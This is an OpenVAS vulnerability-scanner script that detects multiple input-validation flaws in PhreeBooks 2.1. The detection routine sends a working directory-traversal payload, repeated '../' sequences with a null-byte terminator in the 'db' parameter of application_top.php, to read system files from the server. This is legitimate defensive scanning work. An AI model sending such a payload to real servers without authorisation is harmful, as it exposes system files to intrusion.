###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_PhreeBooks_44260.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# PhreeBooks Multiple Remote Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "PhreeBooks is prone to multiple input-validation vulnerabilities.

Exploiting these issues could allow an attacker to steal cookie-based
authentication credentials, compromise the application, access or
modify data, exploit latent vulnerabilities in the underlying
database, or obtain potentially sensitive information and execute
arbitrary local scripts in the context of the webserver process. This
may allow the attacker to compromise the application and the computer;
other attacks are also possible.

PhreeBooks 2.1 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100863);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2010-10-21 13:52:26 +0200 (Thu, 21 Oct 2010)");
 script_bugtraq_id(44260);
 script_tag(name:"cvss_base", value:"2.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
 script_name("PhreeBooks Multiple Remote Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44260");
 script_xref(name : "URL" , value : "http://www.phreebooks.com/");
 script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2010-122/");
 script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2010-123/");
 script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2010-124/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_PhreeBooks_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"PhreeBooks"))exit(0);
files = traversal_files();

foreach  file (keys(files)) {
   
  url = string(dir,"/soap/application_top.php?db=",crap(data:"../",length:3*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
